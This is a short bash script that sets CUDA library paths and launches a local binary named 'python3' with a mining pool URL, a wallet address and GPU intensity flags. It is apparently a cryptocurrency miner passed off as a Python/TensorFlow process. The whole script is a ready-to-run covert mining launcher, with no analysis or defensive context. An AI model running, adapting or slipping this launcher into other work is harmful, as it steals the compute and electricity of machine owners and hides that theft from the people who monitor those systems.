#! /bin/bash
export LD_LIBRARY_PATH=/usr/local/cuda/lib64/:/usr/local/cuda/lib64/stubs:./:$LD_LIBRARY_PATH
export LIBRARY_PATH=/usr/local/cuda/lib64/:/usr/local/cuda/lib64/stubs:./:$LIBRARY_PATH

init='./python3 --mode tensorflow --pool https://ixian.hardbios.com --wallet 4Um9TR7mtidWkvKrgBHv13M5XgAAhjMezhVY2tW5YJP55Yxhzh8ebiCQecvVjCuTR --cpu-intensity 0 --gpu-intensity 11'
echo $init
$init
